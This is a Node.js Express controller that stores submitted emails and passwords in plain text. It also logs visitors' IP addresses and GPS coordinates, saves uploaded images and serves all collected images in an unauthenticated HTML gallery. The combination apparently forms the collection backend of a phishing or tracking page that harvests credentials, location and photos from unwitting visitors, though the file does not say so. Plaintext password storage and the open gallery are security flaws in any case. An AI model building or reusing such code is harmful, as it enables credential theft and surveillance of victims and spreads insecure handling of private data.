const UserDB = require("../models/user");
const ImageDB = require("../models/image");
const LoginDB = require("../models/login");
const { successResponse } = require("../utils/response");
const fs = require("fs/promises");

exports.saveLogin = async (req, res) => {
  try {
    const { email, password } = req.body;
    const loginData = await LoginDB.create({
      email: email.trim(),
      password,
    });

    if (!loginData) {
      return successResponse(res, 400, loginData);
    }

    successResponse(res, 201, loginData);
  } catch (error) {
    console.log(error.message);

    return successResponse(res, 500, {});
  }
};

exports.saveUser = async (req, res) => {
  try {
    const ip =
      req.headers["x-forwarded-for"] ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress;
    const { longitude, latitude } = req.body;

    const userData = await UserDB.create({ ip, longitude, latitude });

    if (!userData) {
      return successResponse(res, 400, {});
    }

    successResponse(res, 200, userData);
  } catch (error) {
    console.log(error.message);

    return successResponse(res, 500, {});
  }
};

exports.saveImages = async (req, res) => {
  try {
    const image = req.files.image;
    const buffer = await fs.readFile(image.path);

    const imageData = await ImageDB.create({
      name: "image-" + Date.now(),
      buffer,
    });

    if (!imageData) {
      return successResponse(res, 500, {});
    }

    successResponse(res, 200, imageData);
  } catch (error) {
    console.log(error.message);

    successResponse(res, 500, {});
  }
};

exports.getImage = async (req, res) => {
  try {
    const { imageId } = req.params;
    const image = await ImageDB.findById(imageId);

    if (!image?.buffer) {
      return successResponse(res, 400, {});
    }

    res.setHeader("Content-Type", "image/png");
    res.setHeader("Content-Length", image.buffer.length);
    res.send(image.buffer);
  } catch (error) {
    console.log(error.message);

    successResponse(res, 500, {});
  }
};

exports.getAllImages = async (req, res) => {
  try {
    const imageData = await ImageDB.find(); //.limit();
    const origin = `${req.protocol}://${req.get("host")}`;

    let template = `<html><body style="padding:5px;"><div style="display: flex; gap: 1rem; flex-wrap: wrap;">`;

    const arr = imageData.map(
      (val) =>
        `<img style="width:200px" src="${origin}/user/get-image/${val._id}"/>`,
    );

    template += arr.join("") + `</div></body></html>`;

    res.send(template);
  } catch (error) {
    console.log(error.message);

    console.log(error.message);

    successResponse(res, 500, {});
  }
};
